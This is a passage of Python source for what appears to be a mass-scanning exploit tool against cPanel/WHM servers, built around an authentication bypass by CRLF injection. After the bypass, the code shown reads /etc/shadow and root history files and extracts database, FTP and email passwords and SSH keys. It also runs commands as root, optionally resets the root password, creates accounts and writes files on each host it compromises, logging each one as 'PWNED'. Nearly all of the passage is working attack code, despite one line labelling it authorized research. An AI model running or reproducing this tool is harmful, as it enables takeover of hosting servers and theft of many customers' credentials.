    log_warn(f"[PASSWD] ⚠ HTTP 200 but cannot verify")
    return False, f"unverified_http_200: {raw[:80]}"

# ══════════════════════════════════════════════════════════
# Stage 5 helpers  
# ══════════════════════════════════════════════════════════
_PROOF_MARKER = f"NX_CVE_2026_41940_{random.randint(100000, 999999)}"

async def _step_server_info(session, scheme, host, port, canonical,
                             sb, token, timeout) -> dict:
    collected: dict = {}
    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "version", {}, timeout)
    if st == 200 and j:
        data = j.get("data") or {}
        collected["version"] = {
            "cpanel_version": data.get("version"),
            "httpd_version":  data.get("httpdversion"),
            "mysql_version":  data.get("mysql"),
            "perl_version":   data.get("perl"),
            "openssl_version":data.get("openssl"),
        }
        log_data(f"cPanel:{data.get('version')} MySQL:{data.get('mysql')} "
                 f"Apache:{data.get('httpdversion')}")

    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "gethostname", {}, timeout)
    if st == 200 and j:
        collected["hostname"] = (j.get("data") or {}).get("hostname")
        log_data(f"hostname: {collected['hostname']}")

    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "listips", {}, timeout)
    if st == 200 and j:
        ips = (j.get("data") or {}).get("ip") or []
        collected["ips"] = [
            {"ip": i.get("ip"), "iface": i.get("iface"), "status": i.get("status")}
            for i in (ips if isinstance(ips, list) else [])
        ]
        log_data(f"IPs: {[i['ip'] for i in collected['ips'][:8]]}")

    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "systeminfo", {}, timeout)
    if st == 200 and j:
        d = j.get("data") or {}
        collected["sysinfo"] = {
            "os_name":   d.get("os_name")    or d.get("osname"),
            "os_version":d.get("os_version") or d.get("rpm_version"),
            "cpu_count": d.get("cpu_count")  or d.get("cpucount"),
            "cpu_model": d.get("cpu_model")  or d.get("cpumodel"),
        }
        log_data(f"OS:{collected['sysinfo'].get('os_name')} "
                 f"CPU:{str(collected['sysinfo'].get('cpu_model','?'))[:40]}")

    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "getloadavg", {}, timeout)
    if st == 200 and j:
        d = j.get("data") or {}
        collected["loadavg"] = {
            "one":    d.get("one")     or d.get("load1"),
            "five":   d.get("five")    or d.get("load5"),
            "fifteen":d.get("fifteen") or d.get("load15"),
        }
    return collected

async def _step_list_accounts(session, scheme, host, port, canonical,
                               sb, token, timeout) -> list[dict]:
    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "listaccts", {}, timeout)
    if st != 200 or not j: return []
    accts  = (j.get("data") or {}).get("acct") or j.get("acct") or []
    result = []
    for a in (accts if isinstance(accts, list) else []):
        result.append({
            "user":      a.get("user"),
            "domain":    a.get("domain") or a.get("maindomain"),
            "ip":        a.get("ip"),
            "diskused":  a.get("diskused"),
            "disklimit": a.get("disklimit"),
            "email":     a.get("email"),
            "plan":      a.get("plan"),
            "suspended": a.get("suspended"),
        })
    log_data(f"cPanel accounts: {len(result)}")
    for a in result[:5]:
        log_data(f"  user={a['user']} domain={a['domain']} "
                 f"disk={a['diskused']}/{a['disklimit']}")
    if len(result) > 5:
        log_data(f"  ... and {len(result)-5} more")
    return result

async def _step_databases(session, scheme, host, port, canonical,
                           sb, token, timeout, accounts) -> dict:
    result: dict = {"global": {}, "per_account": {}}
    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "listdbs", {}, timeout)
    if st == 200 and j:
        dbs = (j.get("data") or {}).get("db") or []
        result["global"]["all_dbs"] = [
            {"name": d.get("db"), "owner": d.get("user")}
            for d in (dbs if isinstance(dbs, list) else [])
        ]
        log_data(f"[G] Total DBs: {len(result['global']['all_dbs'])}")

    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "listdbusers", {}, timeout)
    if st == 200 and j:
        users = (j.get("data") or {}).get("dbuser") or []
        result["global"]["db_users"] = [
            {"user": u.get("user"), "dbs": u.get("db")}
            for u in (users if isinstance(users, list) else [])
        ]

    for acct in accounts[:20]:
        user = acct.get("user")
        if not user: continue
        acct_data: dict = {"dbs": [], "db_users": [], "db_passwords": []}
        st, j, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                      sb, token, user, "Mysql", "list_databases",
                                      {}, timeout)
        if st == 200 and j:
            dbs = (j.get("result") or {}).get("data") or []
            acct_data["dbs"] = [d.get("database") for d in dbs if d.get("database")]

        st, j, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                      sb, token, user, "Mysql", "list_users",
                                      {}, timeout)
        if st == 200 and j:
            db_users = (j.get("result") or {}).get("data") or []
            acct_data["db_users"] = [u.get("user") for u in db_users if u.get("user")]

        for db_user in acct_data["db_users"][:5]:
            st2, j2, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                            sb, token, user, "Mysql", "get_password",
                                            {"user": db_user}, timeout)
            if st2 == 200 and j2:
                pwd = ((j2.get("result") or {}).get("data") or {}).get("password")
                if pwd:
                    acct_data["db_passwords"].append({"user": db_user, "password": pwd})
                    log_data(f"  [G] DB CRED: {user} -> {db_user}:{pwd}")

        if acct_data["dbs"] or acct_data["db_users"]:
            result["per_account"][user] = acct_data
    return result

async def _step_ftp_accounts(session, scheme, host, port, canonical,
                              sb, token, timeout, accounts) -> dict:
    result: dict = {}
    for acct in accounts[:20]:
        user = acct.get("user")
        if not user: continue
        ftp_accounts = []
        st, j, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                      sb, token, user, "Ftp", "list_ftp_with_disk",
                                      {}, timeout)
        if st == 200 and j:
            ftps = (j.get("result") or {}).get("data") or []
            for f in (ftps if isinstance(ftps, list) else []):
                ftp_accounts.append({
                    "login":    f.get("login") or f.get("user"),
                    "homedir":  f.get("homedir") or f.get("dir"),
                    "diskused": f.get("diskusedmb"),
                    "disklimit":f.get("diskquota"),
                    "type":     f.get("type"),
                })
        for ftp in ftp_accounts[:5]:
            login = ftp.get("login", "")
            if not login: continue
            st2, j2, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                            sb, token, user, "Ftp", "get_password",
                                            {"login": login.split("@")[0]}, timeout)
            if st2 == 200 and j2:
                pwd = ((j2.get("result") or {}).get("data") or {}).get("password")
                if pwd:
                    ftp["password"] = pwd
                    log_data(f"  [H] FTP CRED: {login}:{pwd}")
        if ftp_accounts:
            result[user] = ftp_accounts
    return result

async def _step_email_accounts(session, scheme, host, port, canonical,
                                sb, token, timeout, accounts) -> dict:
    result: dict = {}
    for acct in accounts[:20]:
        user   = acct.get("user")
        domain = acct.get("domain", "")
        if not user: continue
        emails = []
        st, j, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                      sb, token, user, "Email", "list_pops",
                                      {}, timeout)
        if st == 200 and j:
            pops = (j.get("result") or {}).get("data") or []
            for p in (pops if isinstance(pops, list) else []):
                emails.append({
                    "email":    p.get("email") or f"{p.get('login')}@{domain}",
                    "login":    p.get("login"),
                    "domain":   p.get("domain"),
                    "diskused": p.get("diskused"),
                    "disklimit":p.get("_diskquota"),
                })
        for email in emails[:5]:
            login = email.get("login", "")
            dom   = email.get("domain", domain)
            if not login: continue
            st2, j2, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                            sb, token, user, "Email",
                                            "get_pop3_password",
                                            {"user": login, "domain": dom}, timeout)
            if st2 == 200 and j2:
                pwd = ((j2.get("result") or {}).get("data") or {}).get("password")
                if pwd:
                    email["password"] = pwd
                    log_data(f"  [I] EMAIL CRED: {login}@{dom}:{pwd}")
        if emails:
            result[user] = emails
    return result

async def _step_extra_intel(session, scheme, host, port, canonical,
                             sb, token, timeout, accounts) -> dict:
    result: dict = {"ssl_certs": [], "dns_zones": [], "ssh_keys": {}}
    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "listcrts", {}, timeout)
    if st == 200 and j:
        certs = (j.get("data") or {}).get("crt") or []
        result["ssl_certs"] = [
            {"domain": c.get("servername"), "issuer": c.get("issuer"),
             "expiry": c.get("notafter"),   "user":   c.get("user")}
            for c in (certs if isinstance(certs, list) else [])
        ]
        log_data(f"  [J] SSL certs: {len(result['ssl_certs'])}")

    st, j, _ = await whm_api(session, scheme, host, port, canonical,
                               sb, token, "listzones", {}, timeout)
    if st == 200 and j:
        zones = (j.get("data") or {}).get("zone") or []
        result["dns_zones"] = [
            {"zone": z.get("zonefile") or z.get("domain"), "serial": z.get("serial")}
            for z in (zones if isinstance(zones, list) else [])
        ]
        log_data(f"  [J] DNS zones: {len(result['dns_zones'])}")

    for acct in accounts[:10]:
        user = acct.get("user")
        if not user: continue
        st, j, _ = await cpanel_uapi(session, scheme, host, port, canonical,
                                      sb, token, user, "SSH", "list_keys",
                                      {}, timeout)
        if st == 200 and j:
            keys = (j.get("result") or {}).get("data") or []
            if keys:
                result["ssh_keys"][user] = [
                    {"name": k.get("name"), "type": k.get("type"),
                     "key":  k.get("key", "")[:80]}
                    for k in (keys if isinstance(keys, list) else [])
                ]
    return result

async def _step_exec_id(session, scheme, host, port, canonical,
                         sb, token, timeout) -> tuple[bool, str]:
    ce = urllib.parse.quote(sb)
    for mod, func in (("Exec","exec"), ("Shell","exec"), ("Exec","shell_exec")):
        params = (f"cpanel_jsonapi_user=root&cpanel_jsonapi_apiversion=2"
                  f"&cpanel_jsonapi_module={mod}&cpanel_jsonapi_func={func}&command=id")
        try:
            resp = await whm_request(
                session, "GET", scheme, host, port, canonical,
                f"{token}/json-api/cpanel?{params}", timeout,
                headers={"Cookie": f"whostmgrsession={ce}"}
            )
            raw = await resp.text(errors="replace")
            if resp.status == 200:
                for key in ("output","stdout","result","data"):
                    try:
                        j   = json.loads(raw)
                        val = ((j.get("cpanelresult") or {}).get("data") or [{}])[0]
                        out = val.get(key) or val.get("output")
                        if out and "uid=" in str(out):
                            log_data(f"[C] {mod}/{func} -> {str(out).strip()[:80]}")
                            return True, str(out).strip()
                    except Exception: pass
                if "uid=" in raw:
                    m = re.search(r"uid=\d+[^\s\"'<\n\r]*", raw)
                    if m:
                        log_data(f"[C] raw -> {m.group(0)}")
                        return True, m.group(0)
        except Exception as ex:
            log_warn(f"      [C] {mod}/{func}: {ex}")

    for cmd in ("id", "/usr/bin/id"):
        try:
            resp = await whm_request(
                session, "GET", scheme, host, port, canonical,
                f"{token}/json-api/system_exec?api.version=1"
                f"&command={urllib.parse.quote(cmd)}",
                timeout, headers={"Cookie": f"whostmgrsession={ce}"}
            )
            raw = await resp.text(errors="replace")
            if resp.status == 200 and "uid=" in raw:
                m = re.search(r"uid=\d+[^\s\"'<\n\r]*", raw)
                if m:
                    log_data(f"[C] system_exec -> {m.group(0)}")
                    return True, m.group(0)
        except Exception as ex:
            log_warn(f"      [C] system_exec {cmd}: {ex}")

    log_warn("      [C] exec id: not available")
    return False, ""

async def _step_read_sensitive(session, scheme, host, port, canonical,
                                sb, token, timeout) -> dict[str, str]:
    ce      = urllib.parse.quote(sb)
    results: dict[str, str] = {}
    for filepath, label in (
        ("/etc/passwd",            "etc_passwd"),
        ("/etc/shadow",            "etc_shadow"),
        ("/etc/cpanel/version",    "cpanel_version_file"),
        ("/etc/hostname",          "etc_hostname"),
        ("/etc/os-release",        "etc_os_release"),
        ("/var/cpanel/users/root", "root_user_file"),
        ("/root/.bash_history",    "root_bash_history"),
        ("/root/.my.cnf",          "mysql_root_cnf"),
    ):
        try:
            resp = await whm_request(
                session, "GET", scheme, host, port, canonical,
                f"{token}/json-api/readfile?"
                f"api.version=1&file={urllib.parse.quote(filepath)}",
                timeout, headers={"Cookie": f"whostmgrsession={ce}"}
            )
            raw = await resp.text(errors="replace")
            if resp.status == 200:
                try:
                    j       = json.loads(raw)
                    data    = j.get("data") or {}
                    content = (data.get("content") or data.get("data") or
                               data.get("file"))
                    if content:
                        results[label] = content
                        log_data(f"[D] {filepath} -> "
                                 f"{content.replace(chr(10),' ')[:80]}")
                except Exception:
                    if "root:" in raw or "hostname" in raw.lower():
                        results[label] = raw[:500]
        except Exception as ex:
            log_warn(f"      [D] {filepath}: {ex}")
    return results

async def _step_create_test_account(session, scheme, host, port, canonical,
                                     sb, token, timeout) -> tuple[bool, str, str]:
    ts       = int(datetime.now().timestamp())
    username = f"nxproof{ts % 100000}"
    domain   = f"nxproof{ts % 100000}.test.invalid"
    password = f"NxProof_{random.randint(10000,99999)}!Aa"
    log_step(f"      [E] creating test account: user={username}  domain={domain}")
    ce = urllib.parse.quote(sb)
    try:
        resp = await whm_request(
            session, "GET", scheme, host, port, canonical,
            f"{token}/json-api/createacct?"
            f"api.version=1&username={urllib.parse.quote(username)}"
            f"&domain={urllib.parse.quote(domain)}"
            f"&password={urllib.parse.quote(password)}"
            f"&contactemail=nxproof%40test.invalid&plan=default",
            timeout, headers={"Cookie": f"whostmgrsession={ce}"}
        )
        raw = await resp.text(errors="replace")
        if resp.status == 200:
            try:
                j       = json.loads(raw)
                result  = j.get("result") or {}
                raw_out = result.get("rawout", "") if isinstance(result, dict) else ""
                status  = result.get("status",  0) if isinstance(result, dict) else 0
                if status == 1 or "created" in raw_out.lower():
                    log_data(f"[E] account CREATED: {username}  {domain}  {password}")
                    return True, username, domain
                err = result.get("statusmsg","") if isinstance(result, dict) else raw[:120]
                log_warn(f"[E] createacct status={status}: {err[:100]}")
            except Exception:
                if "created" in raw.lower():
                    return True, username, domain
        return False, "", ""
    except Exception as e:
        log_warn(f"[E] createacct: {e}")
        return False, "", ""

async def _step_write_marker(session, scheme, host, port, canonical,
                              sb, token, timeout) -> tuple[bool, str]:
    ce      = urllib.parse.quote(sb)
    content = (f"NX_CVE_2026_41940_PROOF\ntimestamp={now_ts()}\n"
               f"host={host}\nmarker={_PROOF_MARKER}\n"
               f"researcher=Nxploited\nnote=authorized_security_research_only\n")
    filepath = f"/tmp/nx_proof_{_PROOF_MARKER}.txt"
    for api_path in (
        (f"{token}/json-api/savefile?api.version=1"
         f"&file={urllib.parse.quote(filepath)}"
         f"&content={urllib.parse.quote(content)}"),
        (f"{token}/json-api/backupset?api.version=1&action=save"
         f"&file={urllib.parse.quote(filepath)}"
         f"&data={urllib.parse.quote(content)}"),
    ):
        try:
            resp = await whm_request(
                session, "GET", scheme, host, port, canonical, api_path,
                timeout, headers={"Cookie": f"whostmgrsession={ce}"}
            )
            raw = await resp.text(errors="replace")
            if resp.status == 200:
                try:
                    j  = json.loads(raw)
                    st = (j.get("data") or {}).get("saved") or j.get("status")
                    if st == 1 or st is True:
                        log_data(f"[F] marker -> {filepath}")
                        return True, filepath
                except Exception:
                    if "saved" in raw.lower() or '"status":1' in raw:
                        return True, filepath
        except Exception:
            pass
    log_warn("      [F] savefile API not available")
    return False, ""

# ══════════════════════════════════════════════════════════
# Stage 5 — proof collection
# ══════════════════════════════════════════════════════════
async def stage5_proof(session, scheme, host, port, canonical,
                        sb, token, timeout, endpoint: str) -> dict:
    proof: dict = {
        "timestamp":       now_ts(),
        "endpoint":        endpoint,
        "host":            host,
        "token":           token,
        "server_info":     {},
        "accounts":        [],
        "exec_id":         {"success": False, "output": ""},
        "sensitive_files": {},
        "databases":       {},
        "ftp_accounts":    {},
        "email_accounts":  {},
        "extra_intel":     {},
        "test_account":    {"created": False, "user": "", "domain": ""},
        "marker_file":     {"written": False, "path": ""},
        "passwd_change":   {"attempted": False, "success": False, "detail": ""},
        "proof_level":     0,
        "summary":         [],
    }

    sep = C_BLK + "─" * 60 + Clr
    print(f"\n  {sep}\n  {C_HI}Stage 5 · proof · {C_TX}{host}{Clr}\n  {sep}")

    log_step("  [A] server info")
    proof["server_info"] = await _step_server_info(
        session, scheme, host, port, canonical, sb, token, timeout)
    if proof["server_info"].get("version"):
        proof["proof_level"] = max(proof["proof_level"], 1)
        proof["summary"].append("server_info_ok")

    log_step("  [B] listing cPanel accounts")
    proof["accounts"] = await _step_list_accounts(
        session, scheme, host, port, canonical, sb, token, timeout)
    if proof["accounts"]:
        proof["proof_level"] = max(proof["proof_level"], 2)
        proof["summary"].append(f"accounts_listed:{len(proof['accounts'])}")

    log_step("  [C] exec id")
    id_ok, id_out = await _step_exec_id(
        session, scheme, host, port, canonical, sb, token, timeout)
    proof["exec_id"] = {"success": id_ok, "output": id_out}
    if id_ok:
        proof["proof_level"] = max(proof["proof_level"], 5)
        proof["summary"].append(f"exec_id:{id_out[:60]}")

    log_step("  [D] reading sensitive files")
    proof["sensitive_files"] = await _step_read_sensitive(
        session, scheme, host, port, canonical, sb, token, timeout)
    if proof["sensitive_files"]:
        proof["proof_level"] = max(proof["proof_level"], 3)
        proof["summary"].append(f"files_read:{list(proof['sensitive_files'].keys())}")

    log_step("  [G] databases + credentials")
    proof["databases"] = await _step_databases(
        session, scheme, host, port, canonical, sb, token, timeout,
        proof["accounts"])
    db_count = (len(proof["databases"].get("global", {}).get("all_dbs") or []) +
                len(proof["databases"].get("per_account", {})))
    if db_count:
        proof["proof_level"] = max(proof["proof_level"], 2)
        proof["summary"].append(f"databases:{db_count}")

    log_step("  [H] FTP accounts")
    proof["ftp_accounts"] = await _step_ftp_accounts(
        session, scheme, host, port, canonical, sb, token, timeout,
        proof["accounts"])
    if proof["ftp_accounts"]:
        proof["proof_level"] = max(proof["proof_level"], 2)
        proof["summary"].append(
            f"ftp_accounts:{sum(len(v) for v in proof['ftp_accounts'].values())}")

    log_step("  [I] email accounts")
    proof["email_accounts"] = await _step_email_accounts(
        session, scheme, host, port, canonical, sb, token, timeout,
        proof["accounts"])
    if proof["email_accounts"]:
        proof["proof_level"] = max(proof["proof_level"], 2)
        proof["summary"].append(
            f"email_accounts:{sum(len(v) for v in proof['email_accounts'].values())}")

    log_step("  [J] SSL / DNS / SSH keys")
    proof["extra_intel"] = await _step_extra_intel(
        session, scheme, host, port, canonical, sb, token, timeout,
        proof["accounts"])
    if (proof["extra_intel"].get("ssl_certs") or
            proof["extra_intel"].get("dns_zones")):
        proof["summary"].append("extra_intel_ok")

    log_step("  [E] creating test account")
    e_ok, e_user, e_domain = await _step_create_test_account(
        session, scheme, host, port, canonical, sb, token, timeout)
    proof["test_account"] = {"created": e_ok, "user": e_user, "domain": e_domain}
    if e_ok:
        proof["proof_level"] = max(proof["proof_level"], 4)
        proof["summary"].append(f"test_account_created:{e_user}")

    log_step("  [F] writing marker file")
    f_ok, f_path = await _step_write_marker(
        session, scheme, host, port, canonical, sb, token, timeout)
    proof["marker_file"] = {"written": f_ok, "path": f_path}
    if f_ok:
        proof["proof_level"] = max(proof["proof_level"], 4)
        proof["summary"].append(f"marker_written:{f_path}")

    await write_study_file(host, "proof.json",
                           json.dumps(proof, ensure_ascii=False, indent=2))

    if proof["proof_level"] >= 5:
        await write_line_async(
            RCE_FILE,
            f"[{now_ts()}] RCE_CONFIRMED  {endpoint}  "
            f"token:{token}  id:{proof['exec_id']['output']}"
        )
        log_full(f"RCE CONFIRMED: {endpoint}  id={proof['exec_id']['output']}")

    return proof

# ══════════════════════════════════════════════════════════
# Enhanced WHM Scanner Class
# ══════════════════════════════════════════════════════════
class WHMScanner:
    def __init__(self):
        self.network_intel = NetworkIntelligence()
        self.discovery_engine = WHMDiscoveryEngine(self.network_intel)
        self.network_prober = NetworkProber()
    
    async def exploit_endpoint(self, ep: Endpoint, timeout: int,
                               new_password: str | None = None) -> dict:
        scheme, host, port, label = ep.scheme, ep.host, ep.port, ep.label
        endpoint_str = f"{ep.url_base} [{label}]"

        connector = aiohttp.TCPConnector(limit_per_host=4, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:

            is_cp, cp_reason = await is_cpanel_endpoint(
                session, scheme, host, port, timeout)
            if cp_reason == "connect_fail":
                return {"endpoint": endpoint_str, "status": Status.CONNECT_FAIL,
                        "detail": cp_reason}
            if not is_cp:
                log_warn(f"[SKIP] {endpoint_str} -- {cp_reason}")
                return {"endpoint": endpoint_str, "status": Status.NOT_CPANEL,
                        "detail": cp_reason}
            log_info(f"[cPanel] {endpoint_str} -- {cp_reason}")

            canonical = await discover_canonical(session, scheme, host, port, timeout)

            log_step(f"[1/4] {endpoint_str} -> pre-auth session")
            sb, r1 = await stage1_preauth(session, scheme, host, port, canonical, timeout)
            if not sb:
                log_fail(f"[1/4] FAIL: {endpoint_str} -> {r1}")
                return {"endpoint": endpoint_str, "status": Status.NO_SESSION, "detail": r1}
            log_info(f"      session_base={sb[:30]}...")

            log_step(f"[2/4] {endpoint_str} -> CRLF injection")
            token, r2 = await stage2_inject(
                session, scheme, host, port, canonical, sb, timeout)
            if not token:
                log_fail(f"[2/4] NO TOKEN: {endpoint_str} -> {r2}")
                await write_line_async(ERRORS_FILE,
                    f"[{now_ts()}] STAGE2_NO_TOKEN  {endpoint_str}  reason:{r2}")
                return {"endpoint": endpoint_str, "status": Status.STAGE2_NO_TOKEN,
                        "detail": r2}
            log_info(f"      token={token}")

            log_step(f"[3/4] {endpoint_str} -> raw->cache propagation")
            s3ok, r3 = await stage3_propagate(
                session, scheme, host, port, canonical, sb, timeout)
            if not s3ok:
                log_fail(f"[3/4] FAIL: {endpoint_str} -> {r3}")
                await write_line_async(ERRORS_FILE,
                    f"[{now_ts()}] STAGE3_FAIL  {endpoint_str}  reason:{r3}")
                return {"endpoint": endpoint_str, "status": Status.STAGE3_FAIL, "detail": r3}

            log_step(f"[4/4] {endpoint_str} -> verify AUTH_OK")
            is_root, r4 = await stage4_verify(
                session, scheme, host, port, canonical, sb, token, timeout)
            if not is_root:
                log_fail(f"      BYPASS_FAILED: {endpoint_str} -> {r4}")
                await write_line_async(ERRORS_FILE,
                    f"[{now_ts()}] STAGE4_NO_ROOT  {endpoint_str}  token:{token}  reason:{r4}")
                return {"endpoint": endpoint_str, "status": Status.STAGE4_NO_ROOT,
                        "detail": r4, "token": token}

            log_ok(f"PWNED  {endpoint_str}  token:{token}  verify:{r4}")

            # ── Stage PASSWD ──────────────────────────────────────
            passwd_result: dict = {"attempted": False, "success": False, "detail": "skipped"}
            if new_password:
                passwd_ok, passwd_detail = await do_passwd(
                    session, scheme, host, port, canonical,
                    sb, token, timeout, new_password, endpoint_str
                )
                passwd_result = {
                    "attempted": True,
                    "success":   passwd_ok,
                    "detail":    passwd_detail,
                }
                if passwd_ok:
                    passwd_line = f"{scheme}://{host}:{port} | root | {new_password}"
                else:
                    passwd_line = (
                        f"[{now_ts()}] PASSWD_FAIL  {endpoint_str}  detail:{passwd_detail}")
                await write_line_async(PASSWD_FILE, passwd_line)
                if passwd_ok:
                    log_pass(f"[+] SUCCESS! Root password changed on {endpoint_str}")
                else:
                    log_fail(f"[-] Password change FAILED on {endpoint_str}: {passwd_detail}")
            # ──────────────────────────────────────────────────────

            proof = await stage5_proof(
                session, scheme, host, port, canonical,
                sb, token, timeout, endpoint_str)
            proof["passwd_change"] = passwd_result

            result_line = (
                f"[{now_ts()}] PWNED  {endpoint_str}  token:{token}  "
                f"canonical:{canonical}  stage3:{r3}  stage4:{r4}  "
                f"proof_level:{proof['proof_level']}  "
                f"passwd_changed:{passwd_result['success']}  summary:{proof['summary']}"
            )
            await write_line_async(RESULTS_FILE, result_line)
            await write_line_async(VULN_FILE,
                f"[{now_ts()}] CONFIRMED_PWNED  {endpoint_str}  token:{token}")

            if ep.source == "ip_fallback":
                await write_line_async(IP_WHM_FILE,
                    f"[{now_ts()}] {endpoint_str}  token:{token}")

            status = (Status.PWNED_FULL if proof["proof_level"] >= 3 else Status.PWNED)
            return {
                "endpoint":      endpoint_str,
                "status":        status,
                "token":         token,
                "canonical":     canonical,
                "proof_level":   proof["proof_level"],
                "summary":       proof["summary"],
                "passwd_change": passwd_result,
                "detail":        r4,
            }
    
    async def comprehensive_target_processing(self, raw: str, timeout: int,
                                              sem: asyncio.Semaphore,
                                              new_password: str | None = None,
                                              discovery_only: bool = False,
                                              exploit_all_open: bool = False) -> list[dict]:
        """Discovery (subdomains, SANs, /24 sample, provider hints) + legacy P0–P4 plan,
        optional TCP filter, fingerprint-only or full exploit with IP fallback + expand."""
        parsed = parse_raw_input(raw)
        if not parsed:
            log_fail(f"[PARSE] {raw!r}")
            await write_line_async(BAD_INPUT_FILE, f"[{now_ts()}] INVALID  {raw}")
            return [{"raw": raw, "status": Status.INVALID}]

        scheme, host, port = parsed
        initial_target = Target(
            scheme=scheme, host=host, port=port, source="input"
        )

        results: list[dict] = []
        pwned: bool = False

        async with sem:
            log_discovery(f"Processing target: {host} ({'discovery+fingerprint only' if discovery_only else 'full pipeline'})")

            discovery_result = await self.discovery_engine.comprehensive_discovery(initial_target)

            intel_record = {
                "timestamp": now_ts(),
                "input": raw,
                "host": host,
                "resolved_ips": discovery_result.resolved_ips,
                "discovered_targets": len(discovery_result.discovered_targets),
                "ssl_domains_sample": discovery_result.ssl_domains[:50],
                "hosting_provider": discovery_result.hosting_provider,
            }
            await write_line_async(INTELLIGENCE_FILE,
                json.dumps(intel_record, ensure_ascii=False))

            if discovery_result.hosting_provider:
                await write_line_async(
                    PROVIDER_FILE,
                    f"[{now_ts()}] {host} -> {discovery_result.hosting_provider}",
                )

            disc_summary = {
                "original_target": host,
                "discovered_count": len(discovery_result.discovered_targets),
                "resolved_ips": discovery_result.resolved_ips,
                "ssl_domains": discovery_result.ssl_domains,
                "hosting_provider": discovery_result.hosting_provider,
                "timestamp": now_ts(),
            }
            await write_line_async(
                DISCOVERY_FILE,
                f"[{now_ts()}] DISCOVERY {json.dumps(disc_summary, ensure_ascii=False)}",
            )

            if discovery_result.ssl_domains:
                await write_line_async(
                    CERTIFICATE_FILE,
                    f"[{now_ts()}] {host} -> {discovery_result.ssl_domains[:80]}",
                )

            plan_eps = build_discovery_plan(raw)
            discovered_eps = targets_to_endpoints(
                discovery_result.discovered_targets, priority=3, label_prefix="DSC"
            )
            all_endpoints = merge_endpoints_unique(plan_eps, discovered_eps)

            hosts_in_plan = list({ep.host for ep in all_endpoints})
            dns_failed: set[str] = set()
            all_ips: list[str] = []
            seen_ip: set[str] = set()
            for h in hosts_in_plan:
                ips = await resolve_all_ips(h)
                if ips:
                    for ip in ips:
                        if ip not in seen_ip:
                            seen_ip.add(ip)
                            all_ips.append(ip)
                elif not _is_ip_str(h):
                    dns_failed.add(h)
                    log_fail(f"[DNS] {h}")

            valid_plan = [ep for ep in all_endpoints if ep.host not in dns_failed]
            valid_plan.sort(key=lambda e: (e.priority, e.source, e.key))

            probe_list: list[Target] = [
                Target(ep.scheme, ep.host, ep.port, source=ep.source) for ep in valid_plan
            ]
            log_discovery(f"TCP probing {len(probe_list)} endpoints (merged plan + discovery)...")
            endpoint_map = {f"{ep.host}:{ep.port}": ep for ep in valid_plan}
            open_targets = await self.network_prober.batch_tcp_probe(probe_list)
            open_endpoints = []
            for t in open_targets:
                ep = endpoint_map.get(f"{t.host}:{t.port}")
                if ep:
                    open_endpoints.append(ep)
            open_endpoints.sort(key=lambda e: (e.priority, e.source, e.key))
            log_discovery(f"Open after TCP probe: {len(open_endpoints)}")

            if discovery_only:
                connector = aiohttp.TCPConnector(limit_per_host=4, ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    for ep in open_endpoints:
                        try:
                            fp = await fingerprint_endpoint(session, ep)
                            results.append({
                                "raw": raw,
                                "endpoint": ep.url_base,
                                "status": Status.DISCOVERY_ONLY,
                                "detail": (
                                    f"score:{fp.score} conf:{fp.confidence} "
                                    f"svc:{fp.service} err:{fp.error}"
                                ),
                            })
                        except Exception as e:
                            results.append({
                                "raw": raw,
                                "endpoint": ep.url_base,
                                "status": Status.ERROR,
                                "detail": str(e),
                            })
                if not results:
                    if hosts_in_plan and len(valid_plan) == 0:
                        results.append({"raw": raw, "status": Status.DNS_FAIL})
                    else:
                        results.append({
                            "raw": raw,
                            "status": Status.DISCOVERY_ONLY,
                            "detail": "no_tcp_open_ports_for_merged_plan",
                        })
                return results

            tried_ep_keys: set[str] = set()

            for ep in open_endpoints:
                if not exploit_all_open and pwned:
                    break
                tried_ep_keys.add(ep.key)
                log_step(
                    f"[EXPLOIT] {ep.url_base}  label={ep.label}  src={ep.source}"
                )
                try:
                    r = await self.exploit_endpoint(ep, timeout, new_password)
                except Exception as e:
                    log_fail(f"[ERR] {ep.url_base} -- {e}")
                    r = {"endpoint": ep.url_base, "status": Status.ERROR, "detail": str(e)}
                results.append(r)
                if r.get("status") in (Status.PWNED, Status.PWNED_FULL):
                    log_ok(f"[TARGET] {raw} -> PWNED via [{ep.label}]")
                    pwned = True

            if all_ips and (exploit_all_open or not pwned):
                for ip in all_ips:
                    if not exploit_all_open and pwned:
                        break
                    if ip == host:
                        continue
                    ip_eps = build_ip_endpoints(ip, priority=3)
                    log_info(
                        f"[IP-FALLBACK] {host} -> {Fore.YELLOW}{ip}{Style.RESET_ALL} "
                        f"| {len(ip_eps)} ports"
                    )
                    for ep in ip_eps:
                        if not exploit_all_open and pwned:
                            break
                        if ep.key in tried_ep_keys:
                            continue
                        if not await tcp_probe(ep.host, ep.port):
                            continue
                        tried_ep_keys.add(ep.key)
                        log_step(
                            f"[EXPLOIT] {ep.url_base}  label={ep.label}  src={ep.source}"
                        )
                        try:
                            r = await self.exploit_endpoint(ep, timeout, new_password)
                        except Exception as e:
                            log_fail(f"[ERR-IP] {ep.url_base} -- {e}")
                            r = {
                                "endpoint": ep.url_base,
                                "status": Status.ERROR,
                                "detail": str(e),
                            }
                        results.append(r)
                        if r.get("status") in (Status.PWNED, Status.PWNED_FULL):
                            log_ok(f"[IP-FALLBACK] {raw} -> PWNED via [{ep.label}]")
                            pwned = True

            if exploit_all_open or not pwned:
                fp_hints = [
                    r
                    for r in results
                    if r.get("status") == Status.NOT_CPANEL
                    and "score:" in (r.get("detail") or "")
                ]
                hinted = []
                for r in fp_hints:
                    m = re.search(r"score:(\d+)", r.get("detail") or "")
                    if m and int(m.group(1)) >= 25:
                        hinted.append(r)
